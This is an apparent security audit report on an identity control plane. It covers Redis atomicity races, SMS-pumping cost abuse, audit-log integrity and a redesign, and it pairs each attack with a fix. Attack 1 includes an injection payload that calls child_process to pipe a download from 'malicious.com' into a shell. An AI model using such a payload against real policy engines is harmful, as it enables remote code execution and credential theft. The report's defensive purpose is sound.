# UICP EXTREME AUDIT REPORT

## 00_Executive_Summary
**VERDICT: LAUNCH BLOCKER**
The Unified Identity Control Plane (UICP) demonstrates high ambition with advanced features (ABAC, UEBA, Outbox, Distributed Locks). However, the architecture is structurally brittle under adversarial pressure. While the "happy path" scales horizontally, the system collapses in edge cases involving infrastructure degradation, economic abuse, and temporal races. Launching this in production will result in financial drain via SMS pumping, silent rate-limit lockouts, and potential Remote Code Execution (RCE) via ABAC DSL injection.

## 01_System_Model
**Trust Boundaries & Leaks**
- **Identity Graph:** Tightly coupled to MySQL primary. Replication lag breaks read-after-write consistency (e.g., login immediately after OTP verify).
- **Verification Layer:** Firebase/SMTP fallback exists but lacks cost-control thresholds.
- **Session Lifecycle:** Redis-backed with in-memory fallbacks that break consistency across horizontal pod scaling.
- **Authorization (ABAC):** Tenant-defined policies are JIT compiled into executable code. This is a severe trust boundary violation if tenant inputs aren't perfectly sanitized.

## 02_Assumption_Destruction
**Assumption:** *Redis INCR + EXPIRE is atomic.*
- **Reality:** In `RateLimiterMiddleware` and `VelocityAnalyzer`, `INCR` is executed, followed by an `EXPIRE` if `count === 1`. If the Node.js process crashes, is OOMKilled, or experiences a network partition exactly between `INCR` and `EXPIRE`, the key lives forever with NO TTL.
- **Consequence:** Permanent denial-of-service for that IP/User.

**Assumption:** *OTP is safe from cost-drain because of IP rate limits.*
- **Reality:** Rate limits fallback to in-memory per-pod if Redis is down. A rotating proxy pool completely bypasses the 10 req/min IP limit.
- **Consequence:** Infinite Firebase SMS triggering.

## 03_Attack_Simulations
### Attack 1: ABAC JIT Remote Code Execution (RCE)
**Steps:**
1. Attacker compromises a Tenant Admin account or abuses a missing validation in `POST /iam/permissions`.
2. Attacker crafts a malicious ABAC condition string. `AbacJitCompiler` transforms `ctx.subject?.role` into raw JavaScript. If the AST parser doesn't perfectly escape strings, attacker injects: `}) || (function(){ require('child_process').execSync('curl malicious.com/shell | sh'); return true; })() || ({`
3. Policy Engine runs `new Function` on the generated string.
**Outcome:** Full system compromise, DB credential theft.
**Fix:** Remove JIT `new Function` compilation. Use a secure AST interpreter (e.g., traversing the AST to evaluate logic without generating JS code).

### Attack 2: SMS Pumping / Cost Explosion
**Steps:**
1. Generate 100K signup requests via rotating IP pool.
2. Trigger `SignupPhoneHandler` endpoint. Each hits Firebase SMS.
3. Each OTP costs ₹3 -> ₹300,000 in <10 minutes.
**Outcome:** Financial bankruptcy.
**Fix:** Implement a global OTP token bucket per tenant + sliding window cost thresholds. Add CAPTCHA/Device Proof-of-Work for SMS routes.

### Attack 3: The "Forever Blocked" Race
**Steps:**
1. Send 1 request to a rate-limited endpoint.
2. Force a TCP RST or crash the specific pod immediately after `INCR` but before `EXPIRE`.
**Outcome:** Target IP or User is rate-limited permanently because the Redis key has no TTL and remains at `count=1` forever.
**Fix:** Use Lua scripts for atomic `INCR` + `EXPIRE` or `SET key 1 EX window NX`.

## 04_Failure_Modes
**Failure:** Redis Outage
**Behavior:**
- Rate limits fall back to in-memory token bucket. In a 50-pod cluster, a 10 req/min limit becomes 500 req/min.
- Distributed Lock falls back to MySQL `GET_LOCK`.
- Sessions fail (no MySQL fallback for `redis-session.store.ts`).
**Consequence:** Auth goes down completely. Resiliency is asymmetric.

**Failure:** MySQL Replication Lag
**Behavior:** User verifies OTP -> primary DB commits -> user requests session -> read replica queried -> user not found.
**Consequence:** Intermittent login failures during high load.

## 05_Economic_Analysis
**Cost under attack:**
- SMS Bombing: Unlimited upside for attacker. No tenant-level daily spend limits implemented.
- Database: `MysqlAuditLogRepository` writes 1 row per event. An attacker spamming `/auth/login` generates infinite Audit Logs + Outbox Relay events. The MySQL DB will fill up, causing an Out-of-Disk outage and driving storage costs exponentially.
**Fix:** Tenant-level spend/rate quotas.

## 06_Performance_Breakpoints
- **10K Users:** System stable.
- **100K Users:** Redis CPU spikes due to `ListAuditLogsHandler` or UEBA `smembers` on large sets. If an attacker adds 10,000 trusted devices, `smembers` blocks Redis event loop.
- **1M Users:** BullMQ `outbox-relay` deadlocks. If MySQL locks rows during outbox relay, `audit-write` queue backs up. Outbox table grows unbounded, causing full table scans.

## 07_Security_Criticals
- **Audit Log Integrity Bypass:** The `hmacKey` is stored in the app environment. If the app is compromised (e.g., via ABAC RCE), the attacker can rewrite `audit_logs` and recalculate the HMAC checksums, leaving no trace.
- **Token Secret Exposure:** `JWT_PRIVATE_KEY` is loaded into memory.

## 08_OTP_System_Audit
- **Weakness:** `FirebaseOtpAdapter` dynamically requires `firebase-admin` and does NOT validate phone numbers comprehensively before hitting the paid API.
- **Bypass:** Sending premium-rate numbers or invalid formats still consumes application resources and potentially provider charges.
- **Fix:** Pre-validation via `libphonenumber-js` and blocking virtual/VoIP numbers for SMS.

## 09_SOC_Gaps
- **Undetected Attack:** The `TorExitNodeChecker` refreshes every 6 hours via BullMQ. An attacker can spin up a new Tor exit node or use residential proxies (not in Tor list) to completely bypass the UEBA 0.4 penalty.
- **Missing Logs:** Failed `INCR` operations in Redis are silently swallowed or fall back.

## 10_Code_Architecture
- **NestJS Flaws:** Circular dependencies masked by `@Inject(forwardRef(() => ...))`. `outbox-relay.worker` relies heavily on `setTimeout` and BullMQ but lacks graceful shutdown handling, risking dropped events if the pod scales down mid-relay.

## 11_Race_Conditions
**Identity Verification Race:**
- `SignupPhoneHandler` creates the user.
- `VerifyOtpHandler` does `await this.otpService.verifyAndConsume(cmd.userId, cmd.code, cmd.purpose);`.
- `otpService` uses `GETDEL` (atomic). This is actually well-designed.
- **However:** The fallback `consumed` sentinel key sets TTL to 60s. If an attacker replays the OTP exactly at 61 seconds, `GETDEL` returns null, and `consumedKey` is expired! Wait, if it's expired, it returns `OTP_EXPIRED`. So it's safe from replay, but the error message leaks whether the OTP was valid and expired, or never existed.

## 12_Future_Readiness
- **2027 Obsolete:** Passkeys (WebAuthn) are entirely missing. The architecture heavily assumes passwords and OTP. The `Credential` entity only supports `bcrypt`. Rust migration will be blocked by tight coupling to NestJS injection tokens and BullMQ-specific payload structures.

## 13_System_Redesign
**10x Version Architectural Overhaul:**
1. **Kill the Node.js API:** Move critical auth paths to Rust/Go for predictable memory and zero JIT overhead.
2. **Atomic Resilience:** Replace all `INCR`+`EXPIRE` pairs with pre-compiled Lua scripts.
3. **Stateless Edge Auth:** Push JWT validation and Rate Limiting to the edge (Cloudflare Workers/Envoy) to drop malicious traffic *before* it hits the cluster.
4. **Append-Only Immutable Audit:** Write audit logs directly to an S3-compatible WORM (Write Once Read Many) bucket via Kinesis/Kafka, removing the MySQL table and HMAC-app-key vulnerability.
5. **Decoupled Policies:** Migrate ABAC to a dedicated Policy Decision Point (PDP) like Open Policy Agent (OPA) using Rego. Do not write custom JIT compilers for security policies.

## 14_Blocker_Questions
1. **How do we survive a 10M SMS flood right now?** (We don't. We go bankrupt.)
2. **If Redis crashes, why do we allow rate limits to loosen by 50x in a multi-pod setup?**
3. **How do we prove to auditors that a rogue admin didn't modify the MySQL Audit Log and re-sign the HMAC using the `.env` key?**

## 15_Brutal_Verdict
**Rating:** Weak
**Failure Likelihood:** 95% under targeted attack.
**Survivability Score:** 2/10
**Justification:** The system appears robust on paper (implementing CQRS, Outbox, Circuit Breakers, UEBA), but the implementation details are structurally flawed. The lack of atomicity in Redis operations, infinite scaling of SMS costs without circuit-breaking spend, and the terrifying prospect of ABAC JIT injection makes this system a liability.

*Do not launch.* Redesign phases 3, 5, and 13 must be executed.
